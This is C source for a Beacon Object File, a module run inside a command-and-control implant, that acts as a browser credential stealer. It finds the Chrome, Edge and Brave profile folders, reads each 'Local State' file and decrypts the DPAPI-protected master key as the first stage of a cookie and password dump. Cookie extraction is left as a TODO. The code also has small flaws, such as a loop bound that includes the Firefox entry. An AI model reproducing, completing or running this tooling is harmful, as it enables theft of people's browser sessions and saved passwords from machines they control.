#include <windows.h>
#include <wincrypt.h>
#include <ncrypt.h>
#include <stdio.h>
#include "beacon.h"

// Forward declarations
DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
DECLSPEC_IMPORT NTSTATUS WINAPI NCryptOpenStorageProvider(NCRYPT_PROV_HANDLE*, LPCWSTR, DWORD);
DECLSPEC_IMPORT NTSTATUS WINAPI NCryptOpenKey(NCRYPT_PROV_HANDLE, NCRYPT_KEY_HANDLE*, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT NTSTATUS WINAPI NCryptDecrypt(NCRYPT_KEY_HANDLE, PBYTE, DWORD, VOID*, PBYTE, DWORD, DWORD*, DWORD);
DECLSPEC_IMPORT NTSTATUS WINAPI NCryptFreeObject(NCRYPT_HANDLE);

// Browser types
#define BROWSER_CHROME  0
#define BROWSER_EDGE    1
#define BROWSER_BRAVE   2
#define BROWSER_FIREFOX 3
#define BROWSER_ALL     4

// Structures
typedef struct {
    char* name;
    char* vendor;
    char* dataDir;
    char* keychainService;
} BrowserConfig;

typedef struct {
    char host[256];
    char name[256];
    char value[2048];
    char path[256];
    long long expiry;
    int isSecure;
} Cookie;

typedef struct {
    char url[512];
    char username[256];
    char password[512];
} Credential;

// Browser configurations
BrowserConfig g_Browsers[] = {
    {"Chrome", "Google", "Google\\Chrome\\User Data", "Chrome Safe Storage"},
    {"Edge", "Microsoft", "Microsoft\\Edge\\User Data", "Microsoft Edge Safe Storage"},
    {"Brave", "Brave Software", "BraveSoftware\\Brave-Browser\\User Data", "Brave Safe Storage"},
    {"Firefox", "Mozilla", "Mozilla\\Firefox", ""}
};

// Helper functions
void* bof_malloc(size_t size) {
    return MSVCRT$malloc(size);
}

void bof_free(void* ptr) {
    if (ptr) MSVCRT$free(ptr);
}

char* bof_strdup(const char* str) {
    if (!str) return NULL;
    size_t len = MSVCRT$strlen(str);
    char* dup = (char*)bof_malloc(len + 1);
    if (dup) {
        MSVCRT$memcpy(dup, str, len);
        dup[len] = '\0';
    }
    return dup;
}

// Base64 decode
int base64_decode(const char* input, unsigned char** output, size_t* outLen) {
    DWORD dwLen = 0;
    if (!CRYPT32$CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL)) {
        return 0;
    }
    
    *output = (unsigned char*)bof_malloc(dwLen);
    if (!*output) return 0;
    
    if (!CRYPT32$CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &dwLen, NULL, NULL)) {
        bof_free(*output);
        *output = NULL;
        return 0;
    }
    
    *outLen = dwLen;
    return 1;
}

// DPAPI decrypt
int dpapi_decrypt(unsigned char* encData, size_t encLen, unsigned char** decData, size_t* decLen) {
    DATA_BLOB dataIn, dataOut;
    dataIn.pbData = encData;
    dataIn.cbData = (DWORD)encLen;
    
    MSVCRT$memset(&dataOut, 0, sizeof(DATA_BLOB));
    
    if (!CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        return 0;
    }
    
    *decData = (unsigned char*)bof_malloc(dataOut.cbData);
    if (!*decData) {
        KERNEL32$LocalFree(dataOut.pbData);
        return 0;
    }
    
    MSVCRT$memcpy(*decData, dataOut.pbData, dataOut.cbData);
    *decLen = dataOut.cbData;
    
    KERNEL32$LocalFree(dataOut.pbData);
    return 1;
}

// Get user data path
int get_user_data_path(int browserType, char* pathOut, size_t pathSize) {
    char userProfile[MAX_PATH];
    DWORD size = MAX_PATH;
    
    if (!KERNEL32$GetEnvironmentVariableA("USERPROFILE", userProfile, size)) {
        return 0;
    }
    
    MSVCRT$snprintf(pathOut, pathSize, "%s\\AppData\\Local\\%s", 
                    userProfile, g_Browsers[browserType].dataDir);
    
    return 1;
}

// Read Local State file
int read_local_state(const char* userDataPath, char** encryptedKey) {
    char localStatePath[MAX_PATH];
    MSVCRT$snprintf(localStatePath, MAX_PATH, "%s\\Local State", userDataPath);
    
    HANDLE hFile = KERNEL32$CreateFileA(localStatePath, GENERIC_READ, FILE_SHARE_READ, 
                                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    char* fileContent = (char*)bof_malloc(fileSize + 1);
    if (!fileContent) {
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    DWORD bytesRead;
    if (!KERNEL32$ReadFile(hFile, fileContent, fileSize, &bytesRead, NULL)) {
        bof_free(fileContent);
        KERNEL32$CloseHandle(hFile);
        return 0;
    }
    
    fileContent[bytesRead] = '\0';
    KERNEL32$CloseHandle(hFile);
    
    // Simple JSON parsing to find encrypted_key
    char* keyStart = MSVCRT$strstr(fileContent, "\"encrypted_key\"");
    if (!keyStart) {
        bof_free(fileContent);
        return 0;
    }
    
    keyStart = MSVCRT$strstr(keyStart, ":");
    if (!keyStart) {
        bof_free(fileContent);
        return 0;
    }
    
    keyStart = MSVCRT$strstr(keyStart, "\"");
    if (!keyStart) {
        bof_free(fileContent);
        return 0;
    }
    keyStart++;
    
    char* keyEnd = MSVCRT$strstr(keyStart, "\"");
    if (!keyEnd) {
        bof_free(fileContent);
        return 0;
    }
    
    size_t keyLen = keyEnd - keyStart;
    *encryptedKey = (char*)bof_malloc(keyLen + 1);
    if (!*encryptedKey) {
        bof_free(fileContent);
        return 0;
    }
    
    MSVCRT$memcpy(*encryptedKey, keyStart, keyLen);
    (*encryptedKey)[keyLen] = '\0';
    
    bof_free(fileContent);
    return 1;
}

// Extract master key
int extract_master_key(const char* encryptedKeyB64, unsigned char** masterKey, size_t* keyLen) {
    unsigned char* encryptedKey;
    size_t encLen;
    
    if (!base64_decode(encryptedKeyB64, &encryptedKey, &encLen)) {
        return 0;
    }
    
    // Check for DPAPI prefix
    if (encLen < 5 || MSVCRT$memcmp(encryptedKey, "DPAPI", 5) != 0) {
        bof_free(encryptedKey);
        return 0;
    }
    
    // Decrypt with DPAPI
    unsigned char* decrypted;
    size_t decLen;
    
    if (!dpapi_decrypt(encryptedKey + 5, encLen - 5, &decrypted, &decLen)) {
        bof_free(encryptedKey);
        return 0;
    }
    
    bof_free(encryptedKey);
    
    // Extract last 32 bytes as master key
    if (decLen < 32) {
        bof_free(decrypted);
        return 0;
    }
    
    *masterKey = (unsigned char*)bof_malloc(32);
    if (!*masterKey) {
        bof_free(decrypted);
        return 0;
    }
    
    MSVCRT$memcpy(*masterKey, decrypted + decLen - 32, 32);
    *keyLen = 32;
    
    bof_free(decrypted);
    return 1;
}

// BOF entry point
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    
    // Parse argument: browser name or "all"
    char* browserArg = BeaconDataExtract(&parser, NULL);
    
    int startBrowser = 0;
    int endBrowser = 3; // Chrome, Edge, Brave
    
    if (browserArg) {
        if (MSVCRT$_stricmp(browserArg, "chrome") == 0) {
            startBrowser = BROWSER_CHROME;
            endBrowser = BROWSER_CHROME;
        } else if (MSVCRT$_stricmp(browserArg, "edge") == 0) {
            startBrowser = BROWSER_EDGE;
            endBrowser = BROWSER_EDGE;
        } else if (MSVCRT$_stricmp(browserArg, "brave") == 0) {
            startBrowser = BROWSER_BRAVE;
            endBrowser = BROWSER_BRAVE;
        } else if (MSVCRT$_stricmp(browserArg, "firefox") == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Firefox support not yet implemented in BOF");
            return;
        } else if (MSVCRT$_stricmp(browserArg, "all") != 0) {
            BeaconPrintf(CALLBACK_ERROR, "Unknown browser: %s. Use: chrome, edge, brave, firefox, or all", browserArg);
            return;
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting cookie dump...\n");
    
    for (int i = startBrowser; i <= endBrowser; i++) {
        char userDataPath[MAX_PATH];
        
        if (!get_user_data_path(i, userDataPath, MAX_PATH)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get user data path for %s", g_Browsers[i].name);
            continue;
        }
        
        // Check if browser exists
        DWORD attrs = KERNEL32$GetFileAttributesA(userDataPath);
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] %s not found", g_Browsers[i].name);
            continue;
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Processing %s...", g_Browsers[i].name);
        
        char* encryptedKeyB64 = NULL;
        if (!read_local_state(userDataPath, &encryptedKeyB64)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to read Local State for %s", g_Browsers[i].name);
            continue;
        }
        
        unsigned char* masterKey;
        size_t keyLen;
        
        if (!extract_master_key(encryptedKeyB64, &masterKey, &keyLen)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract master key for %s", g_Browsers[i].name);
            bof_free(encryptedKeyB64);
            continue;
        }
        
        bof_free(encryptedKeyB64);
        
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Master key extracted for %s (%d bytes)", 
                     g_Browsers[i].name, keyLen);
        
        // TODO: Extract cookies and credentials using master key
        // This requires SQLite integration (see next artifact)
        
        bof_free(masterKey);
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cookie dump complete");
}
